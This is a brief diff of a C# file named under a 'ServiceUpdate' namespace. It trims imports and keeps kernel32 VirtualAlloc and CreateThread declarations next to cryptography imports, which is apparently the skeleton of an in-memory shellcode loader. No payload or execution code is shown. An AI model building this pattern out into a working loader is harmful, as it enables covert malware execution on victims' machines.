@@ -1,8 +1,5 @@
 using System;
-using System.Diagnostics;
-using System.Net;
 using System.Runtime.InteropServices;
-using System.Threading;
 using System.IO;
 using System.Text;
 using System.Security.Cryptography;
@@ -14,8 +11,6 @@ namespace ServiceUpdate
         [DllImport("kernel32.dll")]
         private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
-        [DllImport("kernel32")]
-        private static extern bool VirtualFree(UInt32 lpAddress, UInt32 size, UInt32 dwFreeType);
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
